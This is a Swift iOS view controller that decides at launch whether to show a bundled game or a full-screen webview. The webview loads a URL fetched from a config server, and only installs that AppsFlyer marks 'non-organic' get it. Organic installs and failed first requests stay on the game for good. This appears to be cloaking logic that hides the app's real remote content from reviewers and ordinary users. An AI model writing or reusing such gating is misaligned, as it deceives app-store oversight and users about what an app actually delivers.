import UIKit
import WebKit

final class RootContainerViewController: UIViewController {
    private let reachability = Reachability()
    private let modeManager = LaunchModeManager.shared

    private var current: UIViewController?

    override func viewDidLoad() {
        super.viewDidLoad()
        view.backgroundColor = .systemBackground
        Task { await startFlow() }
        NotificationCenter.default.addObserver(self, selector: #selector(openURLFromPush(_:)), name: .openURLInsideApp, object: nil)
    }

    @objc private func openURLFromPush(_ note: Notification) {
        guard let url = note.object as? URL else { return }
        if modeManager.currentMode == .webview {
            if let webVC = current as? WebContainerViewController {
                webVC.load(url: url)
            } else {
                let web = WebContainerViewController(initialURL: url)
                transition(to: web)
            }
        } else {
            // If in fan mode, decide policy (e.g., present a web VC modally)
            let web = WebContainerViewController(initialURL: url)
            present(web, animated: true)
        }
    }

    private func transition(to vc: UIViewController) {
        addChild(vc)
        vc.view.frame = view.bounds
        vc.view.alpha = 0
        view.addSubview(vc.view)
        vc.didMove(toParent: self)

        let old = current
        current = vc

        UIView.transition(with: view, duration: 0.25, options: [.transitionCrossDissolve]) {
            vc.view.alpha = 1
            old?.view.alpha = 0
        } completion: { _ in
            old?.willMove(toParent: nil)
            old?.view.removeFromSuperview()
            old?.removeFromParent()
        }
    }

    private func showNoInternet() {
        let vc = NoInternetViewController { [weak self] in
            Task { await self?.startFlow(forceFirstLaunch: true) }
        }
        transition(to: vc)
    }

    private func showFan() {
        // Instead of showing generic Fantic, show existing ChickLoading flow
        let vc = ChickLoading()
        let navController = UINavigationController(rootViewController: vc)
        transition(to: navController)
    }

    private func showWeb(url: URL) {
        let web = WebContainerViewController(initialURL: url)
        transition(to: web)
        maybeAskPushPermission()
    }

    private func maybeAskPushPermission() {
        guard LaunchModeManager.shared.currentMode == .webview,
              PushPermissionService.shared.shouldShowCustomAsk() else { return }
        let ask = PushPermissionViewController(
            onAllow: {
                PushPermissionService.shared.requestSystemAuthorization()
            },
            onLater: {
                PushPermissionService.shared.scheduleReaskIn3Days()
            }
        )
        present(ask, animated: true)
    }

    // MARK: Flow
    func startFlow(forceFirstLaunch: Bool = false) async {
        // Проверяем флаг "больше не делать запросы к конфигу"
        if modeManager.shouldSkipConfigRequests {
            print("🚫 Skipping config requests permanently - showing fan mode")
            showFan()
            return
        }
        
        if !forceFirstLaunch, modeManager.currentMode != .undefined {
            // Subsequent launches
            switch modeManager.currentMode {
            case .webview:
                if await reachability.isConnected() {
                    if modeManager.isExpired() {
                        await refetchOrCached()
                    } else if let url = modeManager.cachedURL {
                        showWeb(url: url)
                    } else {
                        await refetchOrCached()
                    }
                } else {
                    showNoInternet()
                }
            case .fan:
                showFan()
            case .undefined: break
            }
            return
        }

        // First launch flow
        guard await reachability.isConnected() else {
            print("🚫 No internet on first launch")
            showNoInternet()
            return
        }

        do {
            print("🚀 [Root] === FIRST LAUNCH FLOW START ===")
            LogCollector.shared.log("Starting first launch flow", category: "Root")
            
            let merged = await AppsFlyerHelper.shared.buildMergedPayload()
            
            // Enforce rule: only allow webview when Non-organic
            let afStatus = (merged["af_status"] as? String)?.lowercased()
            let canAskConfig = (afStatus == "non-organic")
            
            print("🚀 [Root] === DECISION POINT ===")
            print("🚀 [Root] af_status: '\(afStatus ?? "nil")'")
            print("🚀 [Root] canAskConfig: \(canAskConfig)")
            LogCollector.shared.log("Decision: af_status='\(afStatus ?? "nil")', canAskConfig=\(canAskConfig)", category: "Root")
            
            if canAskConfig {
                print("🚀 [Root] ✅ Non-organic install - requesting config from server")
                LogCollector.shared.log("Non-organic install detected - requesting config", category: "Root")
                
                let resp = try await ConfigClient.shared.fetchConfig(withMergedPayload: merged)
                
                print("🚀 [Root] === CONFIG RESPONSE ANALYSIS ===")
                print("🚀 [Root] Response ok: \(resp.ok)")
                print("🚀 [Root] Response url: \(resp.url ?? "nil")")
                print("🚀 [Root] Response message: \(resp.message ?? "nil")")
                LogCollector.shared.log("Config response: ok=\(resp.ok), url=\(resp.url ?? "nil"), message=\(resp.message ?? "nil")", category: "Root")
                
                if resp.ok, let u = resp.url, let url = URL(string: u) {
                    print("🚀 [Root] ✅ Config successful - switching to WebView mode")
                    LogCollector.shared.log("Config successful - switching to WebView mode", category: "Root")
                    modeManager.cache(url: u, expires: resp.expires)
                    modeManager.currentMode = .webview
                    showWeb(url: url)
                } else {
                    print("🚀 [Root] ❌ Config failed - switching to fan mode")
                    LogCollector.shared.logError("Config failed - switching to fan mode")
                    modeManager.currentMode = .fan
                    showFan()
                }
            } else {
                print("🚀 [Root] ℹ️ Organic install - switching to fan mode")
                LogCollector.shared.log("Organic install detected - switching to fan mode", category: "Root")
                modeManager.currentMode = .fan
                showFan()
            }
        } catch {
            print("❌ First launch config error: \(error)")
            // По требованиям: если первый запрос неуспешен и нет сохраненного URL,
            // запустить игру и больше не делать запросов к конфигу
            if modeManager.cachedURL == nil {
                print("🎮 No cached URL - switching to fan mode permanently")
                modeManager.currentMode = .fan
                modeManager.markNoMoreConfigRequests()
                showFan()
            } else {
                // Если есть кешированный URL, используем его
                showWeb(url: modeManager.cachedURL!)
            }
        }
    }

    private func refetchOrCached() async {
        do {
            let merged = await AppsFlyerHelper.shared.buildMergedPayload()
            let resp = try await ConfigClient.shared.fetchConfig(withMergedPayload: merged)
            if resp.ok, let u = resp.url, let url = URL(string: u) {
                modeManager.cache(url: u, expires: resp.expires)
                showWeb(url: url)
            } else if let cached = modeManager.cachedURL {
                print("✅ Loaded from cache")
                showWeb(url: cached)
            } else {
                print("🎮 Falling back to fan")
                modeManager.currentMode = .fan
                showFan()
            }
        } catch {
            if let cached = modeManager.cachedURL {
                print("✅ Loaded from cache (error path): \(error)")
                showWeb(url: cached)
            } else {
                print("🎮 Fallback to fan (no cache)")
                modeManager.currentMode = .fan
                showFan()
            }
        }
    }
}
